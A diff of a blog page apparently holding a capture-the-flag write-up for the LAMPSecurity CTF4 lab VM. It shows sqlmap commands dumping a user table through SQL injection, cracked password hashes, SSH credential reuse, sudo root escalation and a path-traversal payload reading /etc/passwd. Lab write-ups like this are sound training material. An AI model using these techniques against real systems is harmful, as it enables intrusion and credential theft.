@@ -97,12 +97,12 @@
             <p>I start the LAMPSecurity CTF4 challenge of vulnhub
 <a href="http://vulnhub.com/entry/lampsecurity-ctf4,83/">available here</a>.
 The goal is to get a root shell on the server.</p>
-<h1>Discovery</h1>
+<h1 id="discovery">Discovery</h1>
 <p>First of all we need to determine the IP address of the server.
 Since we launch it in a bridged virtual machine the local router got the IP
 address in the DHCP logs. We simply found the most recent one. For me it is
 <code>192.168.1.56</code>.</p>
-<h2>Nmap</h2>
+<h2 id="nmap">Nmap</h2>
 <p>Let start with a simple nmap</p>
 <div class="highlight"><pre><span></span>#<span class="nv">nmap</span> <span class="o">-</span><span class="nv">A</span> <span class="o">-</span><span class="nv">oA</span> <span class="nv">ctf4</span> <span class="mi">192</span>.<span class="mi">168</span>.<span class="mi">1</span>.<span class="mi">56</span>
 <span class="nv">Nmap</span> <span class="mi">6</span>.<span class="mi">47</span> <span class="nv">scan</span> <span class="nv">initiated</span> <span class="nv">Thu</span> <span class="nv">Aug</span> <span class="mi">28</span> <span class="mi">18</span>:<span class="mi">49</span>:<span class="mi">49</span> <span class="mi">2014</span> <span class="nv">as</span>: <span class="nv">nmap</span> <span class="o">-</span><span class="nv">A</span> <span class="o">-</span><span class="nv">oA</span> <span class="nv">ctf4</span> <span class="mi">192</span>.<span class="mi">168</span>.<span class="mi">1</span>.<span class="mi">56</span>
@@ -116,7 +116,7 @@ address in the DHCP logs. We simply found the most recent one. For me it is
 <span class="o">|</span><span class="nv">_</span>  <span class="mi">2048</span> <span class="nv">e7</span>:<span class="mi">70</span>:<span class="nv">d3</span>:<span class="mi">81</span>:<span class="mi">00</span>:<span class="mi">41</span>:<span class="nv">b8</span>:<span class="mi">6</span><span class="nv">e</span>:<span class="nv">fd</span>:<span class="mi">31</span>:<span class="nv">ae</span>:<span class="mi">0</span><span class="nv">e</span>:<span class="mi">00</span>:<span class="nv">ea</span>:<span class="mi">5</span><span class="nv">c</span>:<span class="nv">b4</span> <span class="ss">(</span><span class="nv">RSA</span><span class="ss">)</span>
 <span class="mi">25</span><span class="o">/</span><span class="nv">tcp</span>  <span class="nv">open</span>   <span class="nv">smtp</span>    <span class="nv">Sendmail</span> <span class="mi">8</span>.<span class="mi">13</span>.<span class="mi">5</span><span class="o">/</span><span class="mi">8</span>.<span class="mi">13</span>.<span class="mi">5</span>
 <span class="o">|</span> <span class="nv">smtp</span><span class="o">-</span><span class="nv">commands</span>: <span class="nv">ctf4</span>.<span class="nv">sas</span>.<span class="nv">upenn</span>.<span class="nv">edu</span> <span class="nv">Hello</span> [<span class="mi">192</span>.<span class="mi">168</span>.<span class="mi">1</span>.<span class="mi">97</span>], <span class="nv">pleased</span> <span class="nv">to</span> <span class="nv">meet</span> <span class="nv">you</span>, <span class="nv">ENHANCEDSTATUSCODES</span>, <span class="nv">PIPELINING</span>, <span class="nv">EXPN</span>, <span class="nv">VERB</span>, <span class="mi">8</span><span class="nv">BITMIME</span>, <span class="nv">SIZE</span>, <span class="nv">DSN</span>, <span class="nv">ETRN</span>, <span class="nv">DELIVERBY</span>, <span class="nv">HELP</span>,
-<span class="o">|</span><span class="nv">_</span> <span class="mi">2</span>.<span class="mi">0</span>.<span class="mi">0</span> <span class="nv">This</span> <span class="nv">is</span> <span class="nv">sendmail</span> <span class="nv">version</span> <span class="mi">8</span>.<span class="mi">13</span>.<span class="mi">5</span> <span class="mi">2</span>.<span class="mi">0</span>.<span class="mi">0</span> <span class="nv">Topics</span>: <span class="mi">2</span>.<span class="mi">0</span>.<span class="mi">0</span> <span class="nv">HELO</span> <span class="nv">EHLO</span> <span class="nv">MAIL</span> <span class="nv">RCPT</span> <span class="nv">DATA</span> <span class="mi">2</span>.<span class="mi">0</span>.<span class="mi">0</span> <span class="nv">RSET</span> <span class="nv">NOOP</span> <span class="nv">QUIT</span> <span class="nv">HELP</span> <span class="nv">VRFY</span> <span class="mi">2</span>.<span class="mi">0</span>.<span class="mi">0</span> <span class="nv">EXPN</span> <span class="nv">VERB</span> <span class="nv">ETRN</span> <span class="nv">DSN</span> <span class="nv">AUTH</span> <span class="mi">2</span>.<span class="mi">0</span>.<span class="mi">0</span> <span class="nv">STARTTLS</span> <span class="mi">2</span>.<span class="mi">0</span>.<span class="mi">0</span> <span class="k">For</span> <span class="nv">more</span> <span class="nv">info</span> <span class="nv">use</span> <span class="s2">&quot;</span><span class="s">HELP &lt;topic&gt;</span><span class="s2">&quot;</span>. <span class="mi">2</span>.<span class="mi">0</span>.<span class="mi">0</span> <span class="nv">To</span> <span class="nv">report</span> <span class="nv">bugs</span> <span class="nv">in</span> <span class="nv">the</span> <span class="nv">implementation</span> <span class="k">send</span> <span class="nv">email</span> <span class="nv">to</span> <span class="mi">2</span>.<span class="mi">0</span>.<span class="mi">0</span> <span class="nv">sendmail</span><span class="o">-</span><span class="nv">bugs</span>@<span class="nv">sendmail</span>.<span class="nv">org</span>. <span class="mi">2</span>.<span class="mi">0</span>.<span class="mi">0</span> <span class="k">For</span> <span class="nv">local</span> <span class="nv">information</span> <span class="k">send</span> <span class="nv">email</span> <span class="nv">to</span> <span class="nv">Postmaster</span> <span class="nv">at</span> <span class="nv">your</span> <span class="nv">site</span>. <span class="mi">2</span>.<span class="mi">0</span>.<span class="mi">0</span> <span class="k">End</span> <span class="nv">of</span> <span class="nv">HELP</span> <span class="nv">info</span>
+<span class="o">|</span><span class="nv">_</span> <span class="mi">2</span>.<span class="mi">0</span>.<span class="mi">0</span> <span class="nv">This</span> <span class="nv">is</span> <span class="nv">sendmail</span> <span class="nv">version</span> <span class="mi">8</span>.<span class="mi">13</span>.<span class="mi">5</span> <span class="mi">2</span>.<span class="mi">0</span>.<span class="mi">0</span> <span class="nv">Topics</span>: <span class="mi">2</span>.<span class="mi">0</span>.<span class="mi">0</span> <span class="nv">HELO</span> <span class="nv">EHLO</span> <span class="nv">MAIL</span> <span class="nv">RCPT</span> <span class="nv">DATA</span> <span class="mi">2</span>.<span class="mi">0</span>.<span class="mi">0</span> <span class="nv">RSET</span> <span class="nv">NOOP</span> <span class="nv">QUIT</span> <span class="nv">HELP</span> <span class="nv">VRFY</span> <span class="mi">2</span>.<span class="mi">0</span>.<span class="mi">0</span> <span class="nv">EXPN</span> <span class="nv">VERB</span> <span class="nv">ETRN</span> <span class="nv">DSN</span> <span class="nv">AUTH</span> <span class="mi">2</span>.<span class="mi">0</span>.<span class="mi">0</span> <span class="nv">STARTTLS</span> <span class="mi">2</span>.<span class="mi">0</span>.<span class="mi">0</span> <span class="k">For</span> <span class="nv">more</span> <span class="nv">info</span> <span class="nv">use</span> <span class="s2">"</span><span class="s">HELP &lt;topic&gt;</span><span class="s2">"</span>. <span class="mi">2</span>.<span class="mi">0</span>.<span class="mi">0</span> <span class="nv">To</span> <span class="nv">report</span> <span class="nv">bugs</span> <span class="nv">in</span> <span class="nv">the</span> <span class="nv">implementation</span> <span class="k">send</span> <span class="nv">email</span> <span class="nv">to</span> <span class="mi">2</span>.<span class="mi">0</span>.<span class="mi">0</span> <span class="nv">sendmail</span><span class="o">-</span><span class="nv">bugs</span>@<span class="nv">sendmail</span>.<span class="nv">org</span>. <span class="mi">2</span>.<span class="mi">0</span>.<span class="mi">0</span> <span class="k">For</span> <span class="nv">local</span> <span class="nv">information</span> <span class="k">send</span> <span class="nv">email</span> <span class="nv">to</span> <span class="nv">Postmaster</span> <span class="nv">at</span> <span class="nv">your</span> <span class="nv">site</span>. <span class="mi">2</span>.<span class="mi">0</span>.<span class="mi">0</span> <span class="k">End</span> <span class="nv">of</span> <span class="nv">HELP</span> <span class="nv">info</span>
 <span class="mi">80</span><span class="o">/</span><span class="nv">tcp</span>  <span class="nv">open</span>   <span class="nv">http</span>    <span class="nv">Apache</span> <span class="nv">httpd</span> <span class="mi">2</span>.<span class="mi">2</span>.<span class="mi">0</span> <span class="ss">((</span><span class="nv">Fedora</span><span class="ss">))</span>
 <span class="o">|</span><span class="nv">_http</span><span class="o">-</span><span class="nv">methods</span>: <span class="nv">No</span> <span class="nv">Allow</span> <span class="nv">or</span> <span class="nv">Public</span> <span class="nv">header</span> <span class="nv">in</span> <span class="nv">OPTIONS</span> <span class="nv">response</span> <span class="ss">(</span><span class="nv">status</span> <span class="nv">code</span> <span class="mi">200</span><span class="ss">)</span>
 <span class="o">|</span> <span class="nv">http</span><span class="o">-</span><span class="nv">robots</span>.<span class="nv">txt</span>: <span class="mi">5</span> <span class="nv">disallowed</span> <span class="nv">entries</span>
@@ -127,8 +127,6 @@ address in the DHCP logs. We simply found the most recent one. For me it is
 <span class="nv">No</span> <span class="nv">exact</span> <span class="nv">OS</span> <span class="nv">matches</span> <span class="k">for</span> <span class="nv">host</span> <span class="ss">(</span><span class="nv">test</span> <span class="nv">conditions</span> <span class="nv">non</span><span class="o">-</span><span class="nv">ideal</span><span class="ss">)</span>
 <span class="nv">Service</span> <span class="nv">Info</span>: <span class="nv">Host</span>: <span class="nv">ctf4</span>.<span class="nv">sas</span>.<span class="nv">upenn</span>.<span class="nv">edu</span><span class="c1">; OS: Unix</span>
 </pre></div>
-
-
 <p>We found a list of available services:</p>
 <ul>
 <li>a SSH service on port 22</li>
@@ -136,15 +134,15 @@ address in the DHCP logs. We simply found the most recent one. For me it is
 <li>a web service on port 80, note that there is five disallowed entries in robots.txt</li>
 <li>and a close CUPS service on port 631.</li>
 </ul>
-<h2>The website</h2>
+<h2 id="the website">The website</h2>
 <p>Let's take a look at the web site. It is a simple blog site with a XSS flaw on
 the search engine.</p>
 <p>The article are indexed with a GET parameter id. This parameter is vulnerable to
 an SQL injection.</p>
-<h1>Exploitation</h1>
-<h2>Sqlmap</h2>
+<h1 id="exploitation_1">Exploitation</h1>
+<h2 id="sqlmap">Sqlmap</h2>
 <p>We launch sqlmap:</p>
-<div class="highlight"><pre><span></span>#<span class="nv">sqlmap</span> <span class="o">-</span><span class="nv">u</span> <span class="s1">&#39;</span><span class="s">http://192.168.1.56/index.html?page=blog&amp;title=Blog&amp;id=6</span><span class="s1">&#39;</span> <span class="o">-</span><span class="nv">p</span> <span class="nv">id</span> <span class="o">--</span><span class="nv">tables</span>
+<div class="highlight"><pre><span></span>#<span class="nv">sqlmap</span> <span class="o">-</span><span class="nv">u</span> <span class="s1">'</span><span class="s">http://192.168.1.56/index.html?page=blog&amp;title=Blog&amp;id=6</span><span class="s1">'</span> <span class="o">-</span><span class="nv">p</span> <span class="nv">id</span> <span class="o">--</span><span class="nv">tables</span>
   <span class="nv">sqlmap</span> <span class="nv">identified</span> <span class="nv">the</span> <span class="nv">following</span> <span class="nv">injection</span> <span class="nv">points</span> <span class="nv">with</span> <span class="nv">a</span> <span class="nv">total</span> <span class="nv">of</span> <span class="mi">0</span> <span class="nv">HTTP</span><span class="ss">(</span><span class="nv">s</span><span class="ss">)</span> <span class="nv">requests</span>:
   <span class="o">---</span>
   <span class="nv">Place</span>: <span class="nv">GET</span>
@@ -166,7 +164,7 @@ an SQL injection.</p>
   <span class="nv">web</span> <span class="nv">application</span> <span class="nv">technology</span>: <span class="nv">Apache</span> <span class="mi">2</span>.<span class="mi">2</span>.<span class="mi">0</span>, <span class="nv">PHP</span> <span class="mi">5</span>.<span class="mi">1</span>.<span class="mi">2</span>
   <span class="nv">back</span><span class="o">-</span><span class="k">end</span> <span class="nv">DBMS</span>: <span class="nv">MySQL</span> <span class="mi">5</span>.<span class="mi">0</span>.<span class="mi">11</span>
   [<span class="mi">19</span>:<span class="mi">44</span>:<span class="mi">24</span>] [<span class="nv">INFO</span>] <span class="nv">fetching</span> <span class="nv">database</span> <span class="nv">names</span>
-  [<span class="mi">19</span>:<span class="mi">44</span>:<span class="mi">24</span>] [<span class="nv">INFO</span>] <span class="nv">fetching</span> <span class="nv">tables</span> <span class="k">for</span> <span class="nv">databases</span>: <span class="s1">&#39;</span><span class="s">calendar, ehks, information_schema, mysql, roundcubemail, test</span><span class="s1">&#39;</span>
+  [<span class="mi">19</span>:<span class="mi">44</span>:<span class="mi">24</span>] [<span class="nv">INFO</span>] <span class="nv">fetching</span> <span class="nv">tables</span> <span class="k">for</span> <span class="nv">databases</span>: <span class="s1">'</span><span class="s">calendar, ehks, information_schema, mysql, roundcubemail, test</span><span class="s1">'</span>
   <span class="nv">Database</span>: <span class="nv">calendar</span>
   [<span class="mi">5</span> <span class="nv">tables</span>]
   <span class="o">+---------------------------------------+</span>
@@ -239,10 +237,8 @@ an SQL injection.</p>
   <span class="o">|</span> <span class="nv">time_zone_transition_type</span>             <span class="o">|</span>
   <span class="o">+---------------------------------------+</span>
 </pre></div>
-
-
 <p>Okay so there is a lot of database let's dump the ehks users table:</p>
-<div class="highlight"><pre><span></span><span class="o">#</span> <span class="n">sqlmap</span> <span class="o">-</span><span class="n">u</span> <span class="s1">&#39;http://192.168.1.56/index.html?page=blog&amp;title=Blog&amp;id=6&#39;</span> <span class="o">-</span><span class="n">p</span> <span class="n">id</span> <span class="o">-</span><span class="n">D</span>  <span class="n">ehks</span> <span class="o">-</span><span class="n">T</span> <span class="k">user</span> <span class="c1">--dump</span>
+<div class="highlight"><pre><span></span><span class="o">#</span> <span class="n">sqlmap</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'http://192.168.1.56/index.html?page=blog&amp;title=Blog&amp;id=6'</span> <span class="o">-</span><span class="n">p</span> <span class="n">id</span> <span class="o">-</span><span class="n">D</span>  <span class="n">ehks</span> <span class="o">-</span><span class="n">T</span> <span class="k">user</span> <span class="c1">--dump</span>
 <span class="o">+</span><span class="c1">---------+-----------+----------------------------------+</span>
 <span class="o">|</span> <span class="n">user_id</span> <span class="o">|</span> <span class="n">user_name</span> <span class="o">|</span> <span class="n">user_pass</span>                        <span class="o">|</span>
 <span class="o">+</span><span class="c1">---------+-----------+----------------------------------+</span>
@@ -254,9 +250,7 @@ an SQL injection.</p>
 <span class="o">|</span> <span class="mi">6</span>       <span class="o">|</span> <span class="n">ghighland</span> <span class="o">|</span> <span class="mi">9</span><span class="n">f3eb3087298ff21843cc4e013cf355f</span> <span class="o">|</span>
 <span class="o">+</span><span class="c1">---------+-----------+----------------------------------+</span>
 </pre></div>
-
-
-<h2>Cracking the hashes</h2>
+<h2 id="cracking the hashes">Cracking the hashes</h2>
 <p>We save the hahses in a file (option proposed by sqlmap) and we launch john the
 ripper on it:</p>
 <div class="highlight"><pre><span></span><span class="o">#</span><span class="n">john</span> <span class="n">hashes</span> <span class="c1">--format=raw-md5</span>
@@ -264,8 +258,6 @@ ripper on it:</p>
 <span class="n">jdurbin</span><span class="p">:</span><span class="n">Sue1978</span>
 <span class="mi">2</span> <span class="n">password</span> <span class="n">hashes</span> <span class="n">cracked</span><span class="p">,</span> <span class="mi">4</span> <span class="k">left</span>
 </pre></div>
-
-
 <p>We test the cracked password on:</p>
 <ul>
 <li>the restricted part: there is two text files about how to blog and how to use the web mail</li>
@@ -277,9 +269,7 @@ useual password "undone" so we just tell john to try password from undone0 to
 undone9999. We cracked an other password:</p>
 <div class="highlight"><pre><span></span><span class="n">ghighland</span><span class="o">:</span><span class="n">undone1</span>
 </pre></div>
-
-
-<h2>SSH connexions</h2>
+<h2 id="ssh connexions">SSH connexions</h2>
 <p>Okay the same password seems to be used everywhere and I was a bit lost to how
 to continue so I try the credentials on the ssh service: <em>it works!</em></p>
 <p>First of all I logged with the jdurbin account.
@@ -287,13 +277,13 @@ There seems to be anything useful but in my search I saw that achen had an
 ssh private key readable by everyone (a ppk one for PuTTY).
 Okay lets use it to connect on the machine. It ask no password and we got a
 shell, what now?</p>
-<h2>Privileges escalation</h2>
+<h2 id="privileges escalation">Privileges escalation</h2>
 <p>I try to see what was the differences with this account and I saw a pdf file
 "linux_administration.pdf" so I tried to use the sudo command with <code>sudo -v</code> and
 once again: <em>it works!</em>
 So a simple <code>sudo su</code> give us the root rights.</p>
 <p><em>DONE!</em></p>
-<h1>Summary</h1>
+<h1 id="summary_1">Summary</h1>
 <p>Lets resume :</p>
 <ol>
 <li>exploitation of the SQL injection</li>
@@ -304,13 +294,11 @@ So a simple <code>sudo su</code> give us the root rights.</p>
 <li>sudo su</li>
 </ol>
 <p>That was a easy one !</p>
-<h1>Nota bene</h1>
+<h1 id="nota bene">Nota bene</h1>
 <p>Oh yeah we do not explore the lead of the file injection in the
 page GET parameter:</p>
 <div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">56</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">html</span><span class="o">?</span><span class="n">page</span><span class="o">=</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="o">%</span><span class="mi">00</span><span class="o">&amp;</span><span class="n">title</span><span class="o">=</span><span class="n">Blog</span><span class="o">&amp;</span><span class="n">id</span><span class="o">=</span><span class="mi">5</span>
 </pre></div>
-
-
 <p>Moreover the root password "root1234" where is the <code>bash_history</code> of achen.</p>
     </div>
 
